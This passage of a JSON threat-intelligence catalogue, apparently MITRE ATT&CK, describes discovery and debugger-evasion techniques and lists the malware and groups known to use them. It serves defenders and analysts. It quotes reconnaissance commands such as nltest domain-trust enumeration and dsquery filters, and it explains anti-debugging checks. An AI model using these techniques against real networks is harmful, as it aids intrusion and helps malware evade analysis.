Block Store volumes."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can list AWS S3 buckets."}], "sub_techniques": []}, {"name": "Container and Resource Discovery", "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.", "detailed_description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs. In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.", "id": "T1613", "examples": [{"id": "S0601", "name": "Hildegard", "description": "Hildegard has used masscan to search for kubelets and the kubelet API for additional running containers."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can enumerate Kubernetes pods in a given namespace."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has checked for running containers with docker ps and for specific container names with docker inspect. TeamTNT has also searched for Kubernetes pods running in a local network."}], "sub_techniques": []}, {"name": "Debugger Evasion", "description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.", "detailed_description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\nSpecific checks will vary based on the target and/or adversary, but may involve Native API function calls such as IsDebuggerPresent() and  NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error).\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as OutputDebugStringW().", "id": "T1622", "examples": [{"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can use the CheckRemoteDebuggerPresent function to detect the presence of a debugger."}, {"id": "S1070", "name": "Black Basta", "description": "The Black Basta dropper can check system flags, CPU registers, CPU instructions, process timing, system libraries, and APIs to determine if a debugger is present."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can search for tools used in static analysis."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate checks the BeingDebugged flag in the PEB structure during execution to identify if the malware is being debugged."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can detect debuggers by using functions such as DebuggerIsAttached and DebuggerIsLogging. DarkTortilla can also detect profilers by verifying the COR_ENABLE_PROFILING environment variable is present and active."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can use IsDebuggerPresent to detect whether a debugger is present on a victim."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has the ability to check for the presence of debuggers."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can search for debugging tools on a compromised host."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot features several methods to evade debugging by analysts, including checks for active debuggers, the use of breakpoints during execution, and checking various system information items such as system memory and the number of processors."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin leverages anti-debugging mechanisms through the use of ThreadHideFromDebugger."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can check for debugging tools."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used is_debugger_present as part of its environmental checks."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uses a function named is_debugging to perform anti-debugging logic. The function invokes sysctl checking the returned value of P_TRACED. ThiefQuest also calls ptrace with the PTRACE_DENY_ATTACH flag to prevent debugging."}], "sub_techniques": []}, {"name": "Device Driver Discovery", "description": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. Security Software Discovery) or other defenses (e.g., Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g., Exploitation for Privilege Escalation).", "detailed_description": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. Security Software Discovery) or other defenses (e.g., Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g., Exploitation for Privilege Escalation).\nMany OS utilities may provide information about local device drivers, such as driverquery.exe and the EnumDeviceDrivers() API function on Windows. Information about device drivers (as well as associated services, i.e., System Service Discovery) may also be available in the Registry.\nOn Linux/macOS, device drivers (in the form of kernel modules) may be visible within /dev or using utilities such as lsmod and modinfo.", "id": "T1652", "examples": [{"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT can enumerate device drivers located in the registry at HKLM\\Software\\WBEM\\WDM."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can verify the presence of specific drivers on compromised hosts including Microsoft Print to PDF and Microsoft XPS Document Writer."}, {"id": "S0125", "name": "Remsec", "description": "Remsec has a plugin to detect active drivers of some security products."}], "sub_techniques": []}, {"name": "Domain Trust Discovery", "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using the DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.", "detailed_description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using the DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.", "id": "T1482", "examples": [{"id": "S0552", "name": "AdFind", "description": "AdFind can gather information about organizational units (OUs) and domain trusts from Active Directory."}, {"id": "G1024", "name": "Akira", "description": "Akira uses the built-in Nltest utility or tools such as AdFind to enumerate Active Directory trusts in victim environments."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use nltest.exe /domain_trusts to discover domain trust relationships on a compromised machine."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can use Nltest tools to obtain information about the domain."}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound has the ability to map domain trusts and identify misconfigurations for potential abuse."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use LDAP queries and nltest /domain_trusts for domain trust discovery."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used the command nltest /domain_trusts /all_trusts to enumerate domain trusts."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has nltest /domain_trusts to identify domain trust relationships."}, {"id": "S0105", "name": "dsquery", "description": "dsquery can be used to gather information on domain trusts with dsquery * -filter \"(objectClass=trustedDomain)\" -attr *."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can identify Active Directory information and related items."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used Nltest to obtain information about domain controllers."}, {"id": "S0363", "name": "Empire", "description": "Empire has modules for enumerating domain trusts."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has retrieved a list of trusted domains by using nltest.exe /domain_trusts."}, {"id": "S0483", "name": "IcedID", "description": "IcedID used Nltest during initial discovery."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can run C:\\Windows\\System32\\cmd.exe /c nltest /domain_trusts to discover domain trusts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used a web shell to execute nltest /trusted_domains to identify trust relationships."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for collecting information on local domain users and permissions."}, {"id": "S0359", "name": "Nltest", "description": "Nltest may be used to enumerate trusted domains by using commands such as nltest /domain_trusts."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot will gather information concerning the Windows Domain the victim machine is a member of during execution."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 has modules for enumerating domain trusts."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit has modules such as Get-NetDomainTrust and Get-NetForestTrust to enumerate domain and forest trusts."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can run nltest /domain_trusts /all_trusts for domain trust discovery."}, {"id": "S1071", "name": "Rubeus", "description": "Rubeus can gather information about domain trusts."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish can profile compromised systems to identify domain trust relationships."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used the Get-AcceptedDomain PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used AdFind to enumerate domains and to discover trust between federated domains."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can gather information about domain trusts by utilizing Nltest."}], "sub_techniques": []}, {"name": "File and Directory Discovery", "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "detailed_description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).\nSome files and directories may require elevated or specific user permissions to access.", "id": "T1083", "examples": [{"id": "S0066", "name": "3PARA RAT", "description": "3PARA RAT has a command to retrieve metadata for files on disk as well as a command to list the current working directory."}, {"id": "S0065", "name": "4H RAT", "description": "4H RAT has the capability to obtain file and directory listings."}, {"id": "S1125", "name": "AcidRain", "description": "AcidRain identifies specific files and directories in the Linux operating system associated with storage devices."}, {"id": "S1028", "name": "Action RAT", "description": "Action RAT has the ability to collect drive and file information on an infected machine."}, {"id": "G0018", "name": "admin@338", "description": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir \"c:\\Documents and Settings\" >> %temp%\\download dir \"c:\\Program Files\\\" >> %temp%\\download dir d:\\ >> %temp%\\download"}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL can list files and directories."}, {"id": "S1129", "name": "Akira", "description": "Akira examines files prior to encryption to determine if they meet requirements for encryption and can be encrypted by the ransomware. These checks are performed through native Windows functions such as GetFileAttributesW."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has searched for folders associated with antivirus software."}, {"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon has run scripts to identify file formats including Microsoft Word."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories."}, {"id": "G0026", "name": "APT18", "description": "APT18 can list files information for specific directories."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that looks for files and directories on the local file system."}, {"id": "G0050", "name": "APT32", "description": "APT32's backdoor possesses the capability to list files and directories on a machine. "}, {"id": "G0082", "name": "APT38", "description": "APT38 have enumerated files and directories, or searched in specific locations within a compromised host."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used tools with the ability to search for files on a compromised host."}, {"id": "G0096", "name": "APT41", "description": "APT41 has executed file /bin/pwd on exploited victims, perhaps to return architecture related information."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used the BLOODMINE utility to discover files with .css, .jpg, .png, .gif, .ico, .js, and .jsp extensions in Pulse Secure Connect logs."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to gather metadata from a file and to search for file and directory names."}, {"id": "S0438", "name": "Attor", "description": "Attor has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files."}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred can search through folders and files on the system."}, {"id": "S0129", "name": "AutoIt backdoor", "description": "AutoIt backdoor is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon has searched for specific files prior to encryption."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to browse files in directories such as Program Files and the Desktop."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has searched for files and directories on a compromised network."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can recursively search for files in folders and collects files from the desktop with certain extensions."}, {"id": "S0638", "name": "Babuk", "description": "Babuk has the ability to enumerate files on a targeted system."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has used dir to search for \"programfiles\" and \"appdata\"."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has the ability to identify folders and files related to previous infections."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files."}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE allows adversaries to search for files."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has searched for files on the infected host."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS identifies files with certain extensions from USB devices, then copies them to a predefined directory."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch searches for files with specific file extensions."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has a command to list files on a system."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot searches for files on the victim's machine."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can enumerate the victim's desktop."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT can list file and directory information."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal can retrieve a file listing from the system."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can enumerate specific files for encryption."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can enumerate files for encryption."}, {"id": "S0069", "name": "BLACKCOFFEE", "description": "BLACKCOFFEE has the capability to enumerate files."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry. BlackEnergy has searched for given file types."}, {"id": "S0564", "name": "BlackMould", "description": "BlackMould has the ability to find files on the targeted system."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN can search, read, write, move, and execute files."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can enumerate files and collect associated metadata."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can search for specific files and directories on a machine."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon has searched for files on the system, such as documents located in the desktop folder."}, {"id": "S0252", "name": "Brave Prince", "description": "Brave Prince gathers file and directory information from the victim\u2019s machine."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful."}, {"id": "S0693", "name": "CaddyWiper", "description": "CaddyWiper can enumerate all files and directories on a compromised host."}, {"id": "S0351", "name": "Cannon", "description": "Cannon can obtain victim drive information as well as a list of folders in C:\\Program Files."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload)."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell can search for files in directories."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can parse collected files to identify specific file extensions."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can enumerate drives and list the contents of the C: drive on a victim's computer."}, {"id": "S0144", "name": "ChChes", "description": "ChChes collects the victim's %TEMP% directory path and version of Internet Explorer."}, {"id": "S1096", "name": "Cheerscrypt", "description": "Cheerscrypt can search for log and VMware-related files with .log, .vmdk, .vmem, .vswp, and .vmsn extensions."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has utilized multiple commands to identify data of interest in file and directory listings."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP has the ability to enumerate directories for files that match a set list."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's server component can list directory contents."}, {"id": "S0023", "name": "CHOPSTICK", "description": "An older version of CHOPSTICK has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can browse directories on a compromised host."}, {"id": "S0611", "name": "Clop", "description": "Clop has searched folders and subfolders for files to encrypt."}, {"id": "S0106", "name": "cmd", "description": "cmd can be used to find files and directories with native functionality such as dir commands."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER will survey the contents of system files during installation."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can explore files on a compromised system."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has used a file stealer that checks the Document, Downloads, Desktop, and Picture folders for documents and images with specific extensions."}, {"id": "S0575", "name": "Conti", "description": "Conti can discover files on a local system."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has looked for files in the user's home directory with \"wallet\" in their name using find."}, {"id": "S0212", "name": "CORALDECK", "description": "CORALDECK searches for specified files."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke searches attached and mounted drives for file extensions and keywords that match a predefined list."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can discover specified filetypes and log files on a targeted system."}, {"id": "S1023", "name": "CreepyDrive", "description": "CreepyDrive can specify the local file path to upload files from."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains commands to list files and directories, as well as search for files matching certain extensions from a defined list."}, {"id": "S0235", "name": "CrossRAT", "description": "CrossRAT can list all files on a system."}, {"id": "S0498", "name": "Cryptoistic", "description": "Cryptoistic can scan a directory to identify files for deletion."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can enumerate files by using a variety of functions."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can search for files associated with specific applications."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can use the Linux API statvfs to enumerate the current working directory."}, {"id": "S0497", "name": "Dacls", "description": "Dacls can scan directories on a compromised host."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal collected file listings of all default Windows directories."}, {"id": "S1111", "name": "DarkGate", "description": "Some versions of DarkGate search for the hard-coded folder C:\\Program Files\\e Carte Bleue."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has used malware that searched for files with specific patterns."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has the ability to enumerate file and folder names."}, {"id": "S0255", "name": "DDKONG", "description": "DDKONG lists files on the victim\u2019s machine."}, {"id": "S0616", "name": "DEATHRANSOM", "description": "DEATHRANSOM can use loop operations to enumerate directories on a compromised host."}, {"id": "S0354", "name": "Denis", "description": "Denis has several commands to search directories for files."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi is capable of obtaining directory, file, and drive listings."}, {"id": "S0659", "name": "Diavol", "description": "Diavol has a command to traverse the files and directories in a given path."}, {"id": "S0600", "name": "Doki", "description": "Doki has resolved the path of a process PID to use as a script argument."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to list the directories on a compromised host."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used a batch script to gather folder and file names from victim hosts."}, {"id": "S0547", "name": "DropBook", "description": "DropBook can collect the names of all files and folders in the Program Files directories."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can list files on available disk volumes."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can enumerate files and directories."}, {"id": "S0062", "name": "DustySky", "description": "DustySky scans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine."}, {"id": "S0081", "name": "Elise", "description": "A variant of Elise executes dir C:\\progra~1 when initially run."}, {"id": "S0064", "name": "ELMER", "description": "ELMER is capable of performing directory listings."}, {"id": "S0363", "name": "Empire", "description": "Empire includes various modules for finding files of interest on hosts and network shares."}, {"id": "S0091", "name": "Epic", "description": "Epic recursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\\Temp directories."}, {"id": "S0181", "name": "FALLCHILL", "description": "FALLCHILL can search files on a victim."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can enumerate directories on target machines."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used the Windows dir command to enumerate files and directories in a victim's network."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher enumerates directories and scans for certain files."}, {"id": "S0618", "name": "FIVEHANDS", "description": "FIVEHANDS has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions."}, {"id": "S0036", "name": "FLASHFLOOD", "description": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system and removable media."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb's loader can check for the FoggyWeb backdoor .pri file on a compromised AD FS server."}, {"id": "S0193", "name": "Forfiles", "description": "Forfiles can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)"}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used WizTree to obtain network files and directory listings."}, {"id": "S0277", "name": "FruitFly", "description": "FruitFly looks for specific files and file types."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can identify files with .doc, .docx, .ppt, .pptx, .xls, .xlsx, and .pdf extensions and specific timestamps for collection."}, {"id": "S0628", "name": "FYAnti", "description": "FYAnti can search the C:\\Windows\\Microsoft.NET\\ directory for files of a specified size."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis has the ability to search for files."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can retrieve data from specific Windows directories, as well as open random files as part of Virtualization/Sandbox Evasion."}, {"id": "S0049", "name": "GeminiDuke", "description": "GeminiDuke collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon lists the directories for Desktop, program files, and the user\u2019s recently accessed files."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy has included a program \"ExeProtector\", which monitors for the existence of GoldenSpy on the infected system and redownloads if necessary."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has the ability to enumerate files and directories on a compromised host."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has searched file contents on a compromised host."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can enumerate common folders such as My Documents, Desktop, and AppData."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor has the ability to search the compromised host for files."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has been observed enumerating system drives and partitions."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to retrieve a list of files in a given directory as well as drives and drive types."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser is capable of listing files, folders, and drives on a victim."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives."}, {"id": "S1022", "name": "IceApple", "description": "The IceApple Directory Lister module can list information about files and directories including creation time, last write time, name, and size."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can receive command line arguments to encrypt specific files and directories."}, {"id": "G0100", "name": "Inception", "description": "Inception used a file listing plugin to collect information about file and directories both on local and remote drives."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer\u2019s data wiper component enumerates specific files on all the Windows drives."}, {"id": "S0259", "name": "InnaputRAT", "description": "InnaputRAT enumerates directories and obtains file attributes on a system."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can list information about files in a directory and recently opened or used documents. InvisiMole can also search for specific files by supplied file mask."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe can list file and directory information."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can enumerate drives and their types. It can also change file permissions using cacls.exe."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can browse file systems."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet has the ability to search for a given filename on a victim."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar finds a specified directory, lists the files and metadata about those files."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang uses command-line interaction to search files and directories."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy has a command to launch a file browser or explorer on the system."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE has a command to search for files on the victim\u2019s machine."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can enumerate files and directories on a compromised host."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk has used the FindNextFile command as part of its file deletion process."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has the ability to enumerate all files and directories on an infected system."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used the find command to search for specific files."}, {"id": "S0437", "name": "Kivars", "description": "Kivars has the ability to list drives on the infected host."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can obtain a list of directories."}, {"id": "S0356", "name": "KONNI", "description": "A version of KONNI searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity gathers a list of filenames from the following locations during execution of the final botnet stage: \\/usr\\/sbin\\/, \\/usr\\/bin\\/,  \\/sbin\\/, \\/pfrm2.0\\/bin\\/, \\/usr\\/local\\/bin\\/."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects a list of files and directories in C:\\ with the command dir /s /a c:\\ >> \"C:\\windows\\TEMP[RANDOM].tmp\"."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can collect desktop filenames."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files."}, {"id": "S0211", "name": "Linfo", "description": "Linfo creates a backdoor through which remote attackers can list contents of drives and search for files."}, {"id": "S1121", "name": "LITTLELAMB.WOOLTEA", "description": "LITTLELAMB.WOOLTEA can monitor for system upgrade events by checking for the presence of /tmp/data/root/dev."}, {"id": "S1101", "name": "LoFiSe", "description": "LoFiSe can monitor the file system to identify files less than 6.4 MB in size with file extensions including .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pdf, .rtf, .tif, .odt, .ods, .odp, .eml, and .msg."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot can search for specific files on an infected host."}, {"id": "S0582", "name": "LookBack", "description": "LookBack can retrieve file listings from the victim machine."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used malware that scans for files in the Documents, Desktop, and Download folders and in other drives."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can search its staging directory for output files it has produced."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb has the ability to retrieve directory listings."}, {"id": "S0409", "name": "Machete", "description": "Machete produces file listings in order to search for files to be exfiltrated."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can search for a specific file on the compromised computer and can enumerate files in Desktop, Downloads, and Documents folders."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can search for files and directories."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka can gather information about specific files on the victim system."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex can parse the available drives and directories to determine which files to encrypt."}, {"id": "G0045", "name": 